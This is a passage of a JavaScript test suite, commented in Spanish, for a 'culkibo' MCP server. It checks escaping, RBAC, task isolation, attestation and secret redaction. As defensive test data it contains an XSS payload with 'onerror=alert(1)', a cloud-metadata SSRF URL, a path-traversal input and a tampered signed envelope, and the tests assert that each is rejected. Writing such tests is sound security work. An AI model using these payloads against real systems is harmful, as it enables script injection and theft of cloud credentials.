  for (const [toolName, expectedUri] of [
    ['culkibo_list_projects', 'ui://culkibo/topology'],
    ['culkibo_list_pods', 'ui://culkibo/topology'],
    ['culkibo_diagnose_incident', 'ui://culkibo/incident-remediator'],
    ['culkibo_migrate_coolify', 'ui://culkibo/coolify-migration-diff']
  ]) {
    const spec = mcpServer.getToolByName(toolName);
    assert.strictEqual(spec?._meta?.ui?.resourceUri, expectedUri, `${toolName} debe declarar _meta.ui.resourceUri=${expectedUri}`);
  }
  const podsExec = await mcpServer.executeTool('culkibo_list_pods', {});
  assert.strictEqual(podsExec._meta?.ui?.resourceUri, 'ui://culkibo/topology');

  // 3. 3 MCP Apps resources (`ui://culkibo/*`): MIME, strict CSP, 0 external URLs, XSS escaping, postMessage bridge, RBAC
  const resources = mcpServer.listResources();
  const uiResources = resources.filter((r) => r.uri.startsWith('ui://culkibo/'));
  assert.strictEqual(uiResources.length, 3);
  for (const r of uiResources) {
    assert.strictEqual(r.mimeType, 'text/html;profile=mcp-app');
    assert.ok(String(r._meta?.ui?.csp?.policy || '').includes("default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'"));
    assert.deepStrictEqual(r._meta?.ui?.csp?.connectDomains, []);
    assert.deepStrictEqual(r._meta?.ui?.csp?.resourceDomains, []);
  }

  // XSS + secret-redaction check via temporary project with hostile HTML/script name & secret value
  const xssProj = projectManager.create({
    name: '</script><img src=x onerror=alert(1)> EvilApp',
    description: 'sk_live_never_render_into_mcp_app_999999',
    teamId: 'team_default'
  });

  const app = express();
  app.use(express.json());
  app.post('/api/mcp', mcpStreamableHttp.handlePost);
  const srv = await new Promise((resolve) => {
    const s = app.listen(0, '127.0.0.1', () => resolve(s));
  });
  try {
    for (const uri of ['ui://culkibo/topology', 'ui://culkibo/incident-remediator', 'ui://culkibo/coolify-migration-diff']) {
      const httpRead = await fetch(`http://127.0.0.1:${srv.address().port}/api/mcp`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Accept: 'application/json',
          'MCP-Protocol-Version': V,
          'Mcp-Method': 'resources/read',
          'Mcp-Name': uri
        },
        body: JSON.stringify({
          jsonrpc: '2.0',
          id: `app-${uri}`,
          method: 'resources/read',
          params: {
            uri,
            _meta: { 'io.modelcontextprotocol/protocolVersion': V, 'io.modelcontextprotocol/clientCapabilities': {} }
          }
        })
      });
      assert.strictEqual(httpRead.status, 200, `resources/read HTTP falló para ${uri}`);
      const payload = await httpRead.json();
      const item = payload.result.contents[0];
      assert.strictEqual(item.mimeType, 'text/html;profile=mcp-app');
      assert.ok(item._meta?.ui?.csp?.policy.includes("default-src 'none'"));
      const html = item.text;
      assert.ok(html.includes('Content-Security-Policy'));
      assert.ok(html.includes("default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'"));
      assert.ok(html.includes('window.parent.postMessage'), `${uri} debe incluir puente postMessage JSON-RPC`);
      assert.ok(!/<script[^>]+src=/i.test(html) && !/<link[^>]+href=/i.test(html), `${uri} no puede cargar scripts ni hojas externas`);
      assert.ok(!html.includes('</script><img'), `${uri} debe escapar cualquier intento de cierre de </script> (XSS)`);
      assert.ok(!html.includes('sk_live_never_render_into_mcp_app_999999'), `${uri} jamás puede incrustar secretos en claro`);
    }

    // Unit-level XSS escaping verification on mcpAppsRenderer.safeJsonForScript
    const escaped = mcpAppsRenderer.safeJsonForScript({ evil: '</script><script>alert(1)</script>', secret: 'cket_abc1234567890' });
    assert.ok(!escaped.includes('</script>'));
    assert.ok(escaped.includes('\\u003c/script\\u003e'));
    assert.ok(!escaped.includes('cket_abc1234567890'));

    // RBAC on ui://culkibo/* (revoked -> 0 & FORBIDDEN; narrow token without migrations:read blocked on coolify-migration-diff)
    assert.strictEqual(mcpServer.listResources({ ok: false }).length, 0);
    await assert.rejects(() => mcpServer.readResource('ui://culkibo/topology', { auth: { ok: false } }), /Acceso denegado/);
    const narrowAuth = {
      ok: true,
      method: 'api_token',
      principal: { userId: 'usr_narrow', role: 'viewer', teamId: 'team_default', projectIds: null, scopes: ['projects:read'] }
    };
    const narrowList = mcpServer.listResources(narrowAuth);
    assert.ok(narrowList.some((r) => r.uri === 'ui://culkibo/topology'));
    assert.ok(!narrowList.some((r) => r.uri === 'ui://culkibo/coolify-migration-diff'));
    await assert.rejects(() => mcpServer.readResource('ui://culkibo/coolify-migration-diff', { auth: narrowAuth }), /Acceso denegado/);
    console.log('  ✓ MCP Apps (ui://culkibo/*): 3 apps HTML verificadas (MIME, CSP estricta, 0 URLs externas, anti-XSS, postMessage, RBAC)');
  } finally {
    await new Promise((resolve) => srv.close(resolve));
    projectManager.delete(xssProj.id);
    await projectManager.flushToDisk();
  }

  // 4. culkibo_smartpack_plan (RO, outputSchema, path-boundary security)
  const spRes = await mcpServer.executeTool('culkibo_smartpack_plan', {
    directory: path.join(__dirname, '..', 'web'),
    includeDockerfile: true
  });
  assert.strictEqual(spRes.isError, false);
  const sp = spRes.structuredContent;
  assert.ok(typeof sp.stack === 'string' && sp.stack.length > 0);
  assert.ok(sp.plan && typeof sp.plan.deterministicHash === 'string');
  assert.ok(Array.isArray(sp.dockerignore) && sp.dockerignore.includes('.git'));
  assert.ok(typeof sp.dockerfile === 'string' && sp.dockerfile.includes('FROM '));

  // Path traversal outside workspace blocked with FORBIDDEN_PATH
  const spTraversal = await mcpServer.executeTool('culkibo_smartpack_plan', { directory: path.resolve(os.tmpdir(), '..') });
  assert.strictEqual(spTraversal.isError, true);
  assert.strictEqual(JSON.parse(spTraversal.content[0].text).code, 'FORBIDDEN_PATH');
  console.log(`  ✓ culkibo_smartpack_plan verificado (stack=${sp.stack}, ${sp.dockerignore.length} ignore patterns, path guard OK)`);

  // 5. culkibo_edge_tunnel (admin RBAC, dryRun, isolated create/list/status/revoke, cket_ redaction in auditLog)
  const devAuth = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_et_dev', role: 'developer', teamId: 'team_default', projectIds: null, scopes: ['*'] }
  };
  const devBlocked = await mcpServer.executeTool('culkibo_edge_tunnel', { action: 'list' }, { auth: devAuth });
  assert.strictEqual(devBlocked.isError, true);
  assert.strictEqual(JSON.parse(devBlocked.content[0].text).code, 'FORBIDDEN');

  const tmpEtDir = fs.mkdtempSync(path.join(os.tmpdir(), 'culkibo-mcp-et-'));
  const prevDataDir = process.env.CULKIBO_DATA_DIR;
  process.env.CULKIBO_DATA_DIR = tmpEtDir;
  try {
    const etDry = await mcpServer.executeTool('culkibo_edge_tunnel', {
      action: 'create',
      name: 'mcp-dry-tun',
      targetPort: 3000,
      dryRun: true
    });
    assert.strictEqual(etDry.isError, false);
    assert.strictEqual(etDry.structuredContent.dryRun, true);
    assert.strictEqual(etDry.structuredContent.wouldExecute, true);

    const etCreated = await mcpServer.executeTool('culkibo_edge_tunnel', {
      action: 'create',
      name: 'mcp-live-tun',
      targetHost: '127.0.0.1',
      targetPort: 3456,
      hostname: 'app.tunnel.test'
    });
    assert.strictEqual(etCreated.isError, false);
    const createdTun = etCreated.structuredContent.tunnel;
    assert.ok(createdTun && createdTun.id && typeof createdTun.token === 'string' && createdTun.token.startsWith('cket_'));
    const latestAudit = mcpServer.getAuditLog(1)[0];
    assert.ok(!JSON.stringify(latestAudit).includes(createdTun.token), 'Token cket_ jamás puede filtrarse al auditLog MCP');

    const etList = await mcpServer.executeTool('culkibo_edge_tunnel', { action: 'list' });
    assert.strictEqual(etList.isError, false);
    assert.ok(etList.structuredContent.tunnels.some((t) => t.id === createdTun.id));

    const etRevoke = await mcpServer.executeTool('culkibo_edge_tunnel', { action: 'revoke', tunnelId: createdTun.id });
    assert.strictEqual(etRevoke.isError, false);
    assert.strictEqual(etRevoke.structuredContent.revoked, true);
    console.log('  ✓ culkibo_edge_tunnel verificado (RBAC admin, dryRun, create/list/revoke aislado, cket_ redactado)');
  } finally {
    if (prevDataDir === undefined) delete process.env.CULKIBO_DATA_DIR;
    else process.env.CULKIBO_DATA_DIR = prevDataDir;
    try { fs.rmSync(tmpEtDir, { recursive: true, force: true }); } catch (e) {}
  }
}

/**
 * MCP 2026 Cycle-4: Official Async Tasks (`io.modelcontextprotocol/tasks`),
 * `elicitation/create` remediation schemas, `culkibo_verify_attestation`,
 * `culkibo_otlp_status`, and `-80%+` `?profile=core` at 113 tools.
 */
async function testMcp2026Cycle4TasksElicitationAndTools() {
  const express = require('express');
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const projectManager = require('../server/services/projectManager');
  const mcpStreamableHttp = require('../server/services/mcpStreamableHttp');
  const supplyChainAttestor = require('../server/services/supplyChainAttestor');
  const otlpExporter = require('../server/services/otlpExporter');
  const V = mcpServer.protocol.PROTOCOL_VERSION;
  const meta = () => ({
    'io.modelcontextprotocol/protocolVersion': V,
    'io.modelcontextprotocol/clientCapabilities': {}
  });

  // 1. Capabilities advertisement: `tasks` in both `server/discover` and `initialize`
  const discover = mcpServer.getDiscoverResult();
  assert.deepStrictEqual(discover.capabilities.tasks, {
    list: {},
    cancel: {},
    requests: { tools: { call: {} } }
  }, 'server/discover debe anunciar capabilities.tasks completo');
  assert.ok(!discover.capabilities.sampling, 'No debe anunciar Sampling SEP-2577 deprecado');

  const initRes = await mcpServer.handleJsonRpc({ jsonrpc: '2.0', id: 'c4-init', method: 'initialize', params: {} });
  assert.deepStrictEqual(initRes.result.capabilities.tasks, {
    list: {},
    cancel: {},
    requests: { tools: { call: {} } }
  }, 'initialize debe anunciar capabilities.tasks completo');

  // 2. Async Tasks full lifecycle over Streamable HTTP POST /api/mcp
  const app = express();
  app.use(express.json());
  app.post('/api/mcp', mcpStreamableHttp.handlePost);
  const srv = await new Promise((resolve) => {
    const s = app.listen(0, '127.0.0.1', () => resolve(s));
  });
  const endpoint = `http://127.0.0.1:${srv.address().port}/api/mcp`;
  const postMcp = (method, params, extraHeaders = {}) => fetch(endpoint, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Accept: 'application/json',
      'MCP-Protocol-Version': V,
      'Mcp-Method': method,
      ...extraHeaders
    },
    body: JSON.stringify({ jsonrpc: '2.0', id: `req-${method}-${Math.random().toString(36).slice(2, 6)}`, method, params: { ...params, _meta: meta() } })
  });

  try {
    // 2a. Enqueue tool call with params.task -> immediate `{ task: { taskId, status: 'working', ... } }`
    const createRes = await postMcp(
      'tools/call',
      { name: 'culkibo_list_pods', arguments: {}, task: { ttl: 60000 } },
      { 'Mcp-Name': 'culkibo_list_pods' }
    );
    assert.strictEqual(createRes.status, 200);
    assert.ok(String(createRes.headers.get('cache-control') || '').includes('no-store'), 'Las tareas MCP nunca deben cachearse públicamente');
    const createdPayload = await createRes.json();
    const task = createdPayload.result.task;
    assert.ok(task && typeof task.taskId === 'string' && task.taskId.startsWith('tsk_'));
    assert.strictEqual(task.status, 'working');
    assert.strictEqual(task.ttl, 60000);
    assert.strictEqual(task.pollInterval, 1000);
    assert.ok(typeof task.createdAt === 'string');

    // 2b. tasks/list includes created task
    const listHttp = await postMcp('tasks/list', {});
    assert.strictEqual(listHttp.status, 200);
    const listPayload = await listHttp.json();
    assert.ok(Array.isArray(listPayload.result.tasks) && listPayload.result.tasks.some((t) => t.taskId === task.taskId));

    // 2c. tasks/result waits for completion and returns CallToolResult with related-task metadata
    const resultHttp = await postMcp('tasks/result', { taskId: task.taskId });
    assert.strictEqual(resultHttp.status, 200);
    const resultPayload = await resultHttp.json();
    assert.strictEqual(resultPayload.result.isError, false);
    assert.strictEqual(resultPayload.result._meta['io.modelcontextprotocol/related-task'].taskId, task.taskId);
    assert.ok(resultPayload.result.content[0].text.includes('The Forge'));

    // 2d. tasks/get now shows status === 'completed'
    const getHttp = await postMcp('tasks/get', { taskId: task.taskId });
    assert.strictEqual(getHttp.status, 200);
    const getPayload = await getHttp.json();
    assert.strictEqual(getPayload.result.status, 'completed');

    // 2e. tasks/cancel on a working task -> transitions to 'cancelled', tasks/result fails with TASK_CANCELLED
    const toCancel = await mcpServer.handleModernRpc({
      jsonrpc: '2.0',
      id: 'c4-cancel-create',
      method: 'tools/call',
      params: { name: 'culkibo_list_pods', arguments: {}, task: { ttl: 60000 }, _meta: meta() }
    });
    const cancelTaskId = toCancel.result.task.taskId;
    assert.strictEqual(toCancel.result.task.status, 'working');
    const cancelled = await mcpServer.handleModernRpc({
      jsonrpc: '2.0',
      id: 'c4-cancel-do',
      method: 'tasks/cancel',
      params: { taskId: cancelTaskId, _meta: meta() }
    });
    assert.strictEqual(cancelled.result.status, 'cancelled');
    const cancelledResult = await mcpServer.handleModernRpc({
      jsonrpc: '2.0',
      id: 'c4-cancel-res',
      method: 'tasks/result',
      params: { taskId: cancelTaskId, _meta: meta() }
    });
    assert.ok(cancelledResult.error && cancelledResult.error.data.code === 'TASK_CANCELLED');
    // Cancelling already-terminal task returns JSON-RPC -32602
    const cancelAgain = await mcpServer.handleModernRpc({
      jsonrpc: '2.0',
      id: 'c4-cancel-again',
      method: 'tasks/cancel',
      params: { taskId: cancelTaskId, _meta: meta() }
    });
    assert.ok(cancelAgain.error && cancelAgain.error.code === -32602);
  } finally {
    await new Promise((resolve) => srv.close(resolve));
  }

  // 2f. Cross-tenant RBAC isolation on Async Tasks (zero snooping across principals/teams!)
  const authAlpha = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_task_alpha', role: 'viewer', teamId: 'team_alpha', projectIds: null, scopes: ['*'] }
  };
  const authBeta = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_task_beta', role: 'viewer', teamId: 'team_beta', projectIds: null, scopes: ['*'] }
  };
  const alphaCreate = await mcpServer.handleModernRpc({
    jsonrpc: '2.0',
    id: 'c4-alpha-create',
    method: 'tools/call',
    params: { name: 'culkibo_list_pods', arguments: {}, task: { ttl: 60000 }, _meta: meta() }
  }, { auth: authAlpha });
  const alphaTaskId = alphaCreate.result.task.taskId;

  const betaList = await mcpServer.handleModernRpc({
    jsonrpc: '2.0',
    id: 'c4-beta-list',
    method: 'tasks/list',
    params: { _meta: meta() }
  }, { auth: authBeta });
  assert.ok(!betaList.result.tasks.some((t) => t.taskId === alphaTaskId), 'Principal Beta JAMÁS puede ver tareas de Principal Alpha');

  for (const forbiddenMethod of ['tasks/get', 'tasks/result', 'tasks/cancel']) {
    const attempt = await mcpServer.handleModernRpc({
      jsonrpc: '2.0',
      id: `c4-beta-${forbiddenMethod}`,
      method: forbiddenMethod,
      params: { taskId: alphaTaskId, _meta: meta() }
    }, { auth: authBeta });
    assert.ok(attempt.error && attempt.error.data.code === 'TASK_NOT_FOUND', `Beta debe recibir TASK_NOT_FOUND en ${forbiddenMethod}`);
  }
  // Fail-closed for revoked auth `{ ok: false }`
  const revokedCreate = await mcpServer.handleModernRpc({
    jsonrpc: '2.0',
    id: 'c4-revoked',
    method: 'tasks/list',
    params: { _meta: meta() }
  }, { auth: { ok: false } });
  assert.ok(revokedCreate.error && revokedCreate.error.data.code === 'FORBIDDEN');
  // Wait for alpha task to finish cleanly
  const alphaDone = await mcpServer.handleModernRpc({
    jsonrpc: '2.0',
    id: 'c4-alpha-res',
    method: 'tasks/result',
    params: { taskId: alphaTaskId, _meta: meta() }
  }, { auth: authAlpha });
  assert.strictEqual(alphaDone.result.isError, false);

  // Short TTL eviction test
  const shortTtl = await mcpServer.handleModernRpc({
    jsonrpc: '2.0',
    id: 'c4-short-ttl',
    method: 'tools/call',
    params: { name: 'culkibo_list_pods', arguments: {}, task: { ttl: 100 }, _meta: meta() }
  });
  await new Promise((r) => setTimeout(r, 140));
  const afterExpiry = await mcpServer.handleModernRpc({
    jsonrpc: '2.0',
    id: 'c4-expired-get',
    method: 'tasks/get',
    params: { taskId: shortTtl.result.task.taskId, _meta: meta() }
  });
  assert.ok(afterExpiry.error && afterExpiry.error.data.code === 'TASK_NOT_FOUND');
  console.log('  ✓ MCP 2026-07-28 Async Tasks verificados (capabilities, tasks/list|get|result|cancel, TTL eviction y aislamiento cross-tenant RBAC)');

  // 3. MCP elicitation/create helper + _meta['io.modelcontextprotocol/elicitation'] on CONFIRMATION_REQUIRED / MISSING_SECRET / DEPLOY_FROZEN
  const builtElicit = mcpServer.buildElicitationRequest({
    message: 'Confirm release deployment',
    action: 'ship_and_verify',
    projectId: 'proj_demo',
    requestedSchema: {
      type: 'object',
      properties: { confirm: { type: 'boolean' } },
      required: ['confirm']
    }
  });
  assert.strictEqual(builtElicit.method, 'elicitation/create');
  assert.strictEqual(builtElicit.params.mode, 'form');
  assert.strictEqual(builtElicit.params._meta.action, 'ship_and_verify');
  assert.strictEqual(builtElicit.params._meta.projectId, 'proj_demo');

  const tmpProj = projectManager.create({
    name: 'Cycle4 Elicitation Test App',
    teamId: 'team_default'
  });
  try {
    // 3a. CONFIRMATION_REQUIRED attaches _meta['io.modelcontextprotocol/elicitation']
    const noConfirm = await mcpServer.executeTool('culkibo_ship_and_verify', { projectId: tmpProj.id });
    assert.strictEqual(noConfirm.isError, true);
    assert.strictEqual(JSON.parse(noConfirm.content[0].text).code, 'CONFIRMATION_REQUIRED');
    const confirmElicit = noConfirm._meta['io.modelcontextprotocol/elicitation'];
    assert.ok(confirmElicit && confirmElicit.method === 'elicitation/create');
    assert.ok(confirmElicit.params.requestedSchema.required.includes('confirmToken'));

    // 3b. SECRET_LEAK_DETECTED (TOCTOU guard on Phase 2) attaches elicitation metadata
    const dryClean = await mcpServer.executeTool('culkibo_ship_and_verify', { projectId: tmpProj.id, dryRun: true });
    assert.strictEqual(dryClean.isError, false);
    assert.ok(typeof dryClean.structuredContent.confirmToken === 'string' && dryClean.structuredContent.confirmToken.startsWith('ckr_'));
    projectManager.update(tmpProj.id, { envVars: { STRIPE_KEY: ['sk', 'live', '0123456789abcdef0123456789abcdef'].join('_') } });
    const leakedShip = await mcpServer.executeTool('culkibo_ship_and_verify', {
      projectId: tmpProj.id,
      dryRun: false,
      confirmToken: dryClean.structuredContent.confirmToken
    });
    assert.strictEqual(leakedShip.isError, true);
    assert.strictEqual(JSON.parse(leakedShip.content[0].text).code, 'SECRET_LEAK_DETECTED');
    assert.strictEqual(leakedShip._meta['io.modelcontextprotocol/elicitation']?.method, 'elicitation/create');

    // 3c. MISSING_SECRET & DEPLOY_FROZEN / DEPLOY_FREEZE_ACTIVE schema builders
    const missingSecretElicit = mcpServer._buildErrorElicitation('culkibo_set_project_env', { projectId: tmpProj.id }, {
      code: 'MISSING_SECRET',
      message: 'Missing DATABASE_URL',
      details: { secretKey: 'DATABASE_URL' }
    }, null);
    assert.strictEqual(missingSecretElicit.method, 'elicitation/create');
    assert.ok(missingSecretElicit.params.requestedSchema.properties.storeInVault);
    assert.strictEqual(missingSecretElicit.params.requestedSchema.properties.secretKey.default, 'DATABASE_URL');

    const frozenElicit = mcpServer._buildErrorElicitation('culkibo_ship_and_verify', { projectId: tmpProj.id }, {
      code: 'DEPLOY_FROZEN',
      message: 'Deploy freeze active'
    }, null);
    assert.strictEqual(frozenElicit.method, 'elicitation/create');
    assert.ok(frozenElicit.params.requestedSchema.properties.overrideFreeze);
    assert.ok(frozenElicit.params.requestedSchema.required.includes('reason'));
  } finally {
    projectManager.delete(tmpProj.id);
    await projectManager.flushToDisk();
  }
  console.log('  ✓ MCP elicitation/create verificado (CONFIRMATION_REQUIRED, SECRET_LEAK_DETECTED, MISSING_SECRET y DEPLOY_FROZEN)');

  // 4. culkibo_verify_attestation (RO, isolated CULKIBO_DATA_DIR, Ed25519 DSSE verify + tamper reject + anti-IDOR)
  const tmpDataRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'culkibo-mcp-slsa-'));
  const prevDataDir = process.env.CULKIBO_DATA_DIR;
  process.env.CULKIBO_DATA_DIR = tmpDataRoot;
  const attProj = projectManager.create({ name: 'SLSA Attest Project', teamId: 'team_default' });
  try {
    const pubKeyRes = await mcpServer.executeTool('culkibo_verify_attestation', { action: 'public_key' });
    assert.strictEqual(pubKeyRes.isError, false);
    assert.ok(pubKeyRes.structuredContent.publicKeyPem.includes('BEGIN PUBLIC KEY'));

    const attested = supplyChainAttestor.attestRelease({
      projectId: attProj.id,
      revision: 'rev-c4-1',
      commitSha: 'a1b2c3d4e5f60718293a4b5c6d7e8f9012345678',
      sbomSummary: { bomFormat: 'CycloneDX', specVersion: '1.6', componentCount: 93, rootDependencies: 6 }
    });
    assert.strictEqual(attested.ok, true);

    const verifiedStored = await mcpServer.executeTool('culkibo_verify_attestation', {
      action: 'verify',
      projectId: attProj.id,
      revision: 'rev-c4-1'
    });
    assert.strictEqual(verifiedStored.isError, false);
    assert.strictEqual(verifiedStored.structuredContent.valid, true);
    assert.strictEqual(verifiedStored.structuredContent.verification.algorithm, 'Ed25519');
    assert.strictEqual(verifiedStored.structuredContent.verification.slsaVersion, '1.1');

    // Tampered DSSE envelope must fail cryptographic verification cleanly
    const tamperedEnv = JSON.parse(JSON.stringify(attested.envelope));
    const decodedPayload = JSON.parse(Buffer.from(tamperedEnv.payload, 'base64').toString('utf8'));
    decodedPayload.subject[0].name = 'culkibo://evil-tampered';
    tamperedEnv.payload = Buffer.from(JSON.stringify(decodedPayload), 'utf8').toString('base64');
    const tamperedRes = await mcpServer.executeTool('culkibo_verify_attestation', {
      action: 'verify',
      envelope: tamperedEnv
    });
    assert.strictEqual(tamperedRes.isError, false);
    assert.strictEqual(tamperedRes.structuredContent.valid, false);
    assert.strictEqual(tamperedRes.structuredContent.verification.reason, 'INVALID_SIGNATURE');

    // Anti-IDOR RBAC check: viewer scoped to different project blocked
    const otherViewer = {
      ok: true,
      method: 'api_token',
      principal: { userId: 'usr_slsa_other', role: 'viewer', teamId: 'team_default', projectIds: ['proj_unrelated'], scopes: ['*'] }
    };
    const idorAtt = await mcpServer.executeTool('culkibo_verify_attestation', {
      action: 'verify',
      projectId: attProj.id,
      revision: 'rev-c4-1'
    }, { auth: otherViewer });
    assert.strictEqual(idorAtt.isError, true);
    assert.strictEqual(JSON.parse(idorAtt.content[0].text).code, 'FORBIDDEN');
    console.log('  ✓ culkibo_verify_attestation verificado (SLSA v1.1 Ed25519 DSSE pass, tamper INVALID_SIGNATURE y anti-IDOR)');
  } finally {
    projectManager.delete(attProj.id);
    await projectManager.flushToDisk();
    if (prevDataDir === undefined) delete process.env.CULKIBO_DATA_DIR;
    else process.env.CULKIBO_DATA_DIR = prevDataDir;
    try { fs.rmSync(tmpDataRoot, { recursive: true, force: true }); } catch (e) {}
  }

  // 5. culkibo_otlp_status (admin RBAC, header redaction, SSRF metadata rejection, clean restore)
  const devAuth = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_otlp_dev', role: 'developer', teamId: 'team_default', projectIds: null, scopes: ['*'] }
  };
  const otlpDevBlocked = await mcpServer.executeTool('culkibo_otlp_status', { action: 'status' }, { auth: devAuth });
  assert.strictEqual(otlpDevBlocked.isError, true);
  assert.strictEqual(JSON.parse(otlpDevBlocked.content[0].text).code, 'FORBIDDEN');

  try {
    const otlpStatus = await mcpServer.executeTool('culkibo_otlp_status', { action: 'status' });
    assert.strictEqual(otlpStatus.isError, false);
    assert.strictEqual(otlpStatus.structuredContent.status.protocol, 'otlp/http-json');
    assert.strictEqual(otlpStatus.structuredContent.status.contentEncoding, 'gzip');

    const otlpCfg = await mcpServer.executeTool('culkibo_otlp_status', {
      action: 'configure',
      endpoint: 'https://tempo.example.com:4318',
      headers: { Authorization: 'Bearer sk_live_otlp_secret_never_leak_999' },
      serviceName: 'culkibo-test-plane',
      enabled: false
    });
    assert.strictEqual(otlpCfg.isError, false);
    assert.strictEqual(otlpCfg.structuredContent.configured, true);
    assert.ok(!JSON.stringify(otlpCfg.structuredContent).includes('sk_live_otlp_secret_never_leak_999'), 'Authorization debe redactarse en status OTLP');
    assert.ok(!JSON.stringify(mcpServer.getAuditLog(1)[0]).includes('sk_live_otlp_secret_never_leak_999'), 'Authorization debe redactarse en auditLog MCP');

    // Cloud metadata SSRF rejected cleanly
    const otlpSsrf = await mcpServer.executeTool('culkibo_otlp_status', {
      action: 'configure',
      endpoint: 'http://169.254.169.254/latest/meta-data'
    });
    assert.strictEqual(otlpSsrf.isError, true);
    assert.strictEqual(JSON.parse(otlpSsrf.content[0].text).code, 'INVALID_ARGUMENT');
    console.log('  ✓ culkibo_otlp_status verificado (RBAC admin, redacción Authorization y bloqueo SSRF metadatos cloud)');
  } finally {
    otlpExporter.configure({ endpoint: null, headers: {}, enabled: false, serviceName: 'culkibo-control-plane', allowLoopback: false });
  }

  // 6. ?profile=core maintains -80%+ serialized token savings at 160 tools
  const fullBytes = Buffer.byteLength(JSON.stringify(mcpServer.getToolsForPrincipal(null, { profile: 'all' })), 'utf8');
  const coreTools = mcpServer.getToolsForPrincipal(null, { profile: 'core' });
  const coreBytes = Buffer.byteLength(JSON.stringify(coreTools), 'utf8');
  const savedPct = Math.round((1 - coreBytes / fullBytes) * 1000) / 10;
  assert.strictEqual(mcpServer.getToolsDefinition().length, 170);
  assert.ok(savedPct >= 80, `?profile=core debe ahorrar >=80% tokens sobre 160 tools (actual: ${savedPct}%)`);
  console.log(`  ✓ ?profile=core sobre 160 tools: ${coreTools.length}/160 herramientas (-${savedPct}% bytes/tokens)`);
}

/**
 * MCP 2026 Cycle-6: Shadow Traffic Replay (`culkibo_shadow_replay`),
 * Whole-Stack Time-Machine (`culkibo_time_machine`), FinOps Cloud Savings (`culkibo_finops_report`),
 * and `-82%+` `?profile=core` over 116 tools.
 */
async function testMcp2026Cycle6ShadowTimeMachineFinOps() {
  const fs = require('fs');
  const http = require('http');
  const os = require('os');
  const path = require('path');
  const projectManager = require('../server/services/projectManager');
  const timeMachineService = require('../server/services/timeMachineService');

  const tmpDataRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'culkibo-mcp-c6-'));
  const prevDataDir = process.env.CULKIBO_DATA_DIR;
  process.env.CULKIBO_DATA_DIR = tmpDataRoot;
  const resetTmCache = () => {
    timeMachineService._loaded = false;
    timeMachineService._masterKey = null;
    timeMachineService._hmacKey = null;
    timeMachineService.state = { version: 1, projects: Object.create(null) };
  };
  resetTmCache();

  const projC6 = projectManager.create({
    name: 'Cycle6 Pioneer App',
    description: 'Initial v1 description',
    teamId: 'team_default',
    memoryMb: 1024,
    envVars: { API_MODE: 'v1', SECRET_TOKEN: 'sk_live_c6_never_leak_999999' }
  });
  const projOther = projectManager.create({
    name: 'Cycle6 Foreign App',
    teamId: 'team_default',
    memoryMb: 512
  });

  // 1. culkibo_shadow_replay: PROMOTE vs BLOCK_CUTOVER, secret redaction, SSRF block & RBAC
  let candidateMode = 'healthy';
  const baseSrv = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ ok: true, id: 1, version: 'v1', items: [{ sku: 'a' }] }));
  });
  const candSrv = http.createServer((req, res) => {
    if (candidateMode === 'broken') {
      res.writeHead(500, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: false, error: 'boom' }));
      return;
    }
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ ok: true, id: 2, version: 'v2', items: [{ sku: 'b' }] }));
  });
  await Promise.all([
    new Promise((r) => baseSrv.listen(0, '127.0.0.1', () => r(undefined))),
    new Promise((r) => candSrv.listen(0, '127.0.0.1', () => r(undefined)))
  ]);

  try {
    const baseUrl = `http://127.0.0.1:${baseSrv.address().port}`;
    const candUrl = `http://127.0.0.1:${candSrv.address().port}`;

    // Viewer blocked (write tool) + scoped developer anti-IDOR blocked on foreign project
    const viewerAuth = {
      ok: true,
      method: 'api_token',
      principal: { userId: 'usr_c6_viewer', role: 'viewer', teamId: 'team_default', projectIds: [projC6.id], scopes: ['*'] }
    };
    const scopedDevAuth = {
      ok: true,
      method: 'api_token',
      principal: { userId: 'usr_c6_dev', role: 'developer', teamId: 'team_default', projectIds: [projC6.id], scopes: ['*'] }
    };

    const viewerShadow = await mcpServer.executeTool('culkibo_shadow_replay', {
      projectId: projC6.id,
      baselineUrl: baseUrl,
      candidateUrl: candUrl,
      requests: [{ method: 'GET', path: '/health' }],
      allowLoopback: true
    }, { auth: viewerAuth });
    assert.strictEqual(viewerShadow.isError, true);
    assert.strictEqual(JSON.parse(viewerShadow.content[0].text).code, 'FORBIDDEN');

    const idorShadow = await mcpServer.executeTool('culkibo_shadow_replay', {
      projectId: projOther.id,
      baselineUrl: baseUrl,
      candidateUrl: candUrl,
      requests: [{ method: 'GET', path: '/health' }],
      allowLoopback: true
    }, { auth: scopedDevAuth });
    assert.strictEqual(idorShadow.isError, true);
    assert.strictEqual(JSON.parse(idorShadow.content[0].text).code, 'FORBIDDEN');

    // Cloud-metadata SSRF blocked
    const ssrfShadow = await mcpServer.executeTool('culkibo_shadow_replay', {
      projectId: projC6.id,
      baselineUrl: 'http://169.254.169.254/latest/meta-data',
      candidateUrl: candUrl,
      requests: [{ method: 'GET', path: '/' }],
      allowLoopback: true
    });
    assert.strictEqual(ssrfShadow.isError, true);
    assert.strictEqual(JSON.parse(ssrfShadow.content[0].text).code, 'INVALID_ARGUMENT');

    // Pass scenario -> PROMOTE + Authorization redacted
    const passReplay = await mcpServer.executeTool('culkibo_shadow_replay', {
      projectId: projC6.id,
      baselineUrl: baseUrl,
      candidateUrl: candUrl,
      requests: [{ method: 'GET', path: '/api/items', headers: { Authorization: 'Bearer sk_live_shadow_never_store_999' } }],
      allowLoopback: true
    }, { auth: scopedDevAuth });
    assert.strictEqual(passReplay.isError, false);
    assert.strictEqual(passReplay.structuredContent.pass, true);
    assert.strictEqual(passReplay.structuredContent.verdict, 'PROMOTE');
    assert.ok(!JSON.stringify(passReplay.structuredContent).includes('sk_live_shadow_never_store_999'), 'Authorization jamás puede almacenarse en shadow replay');
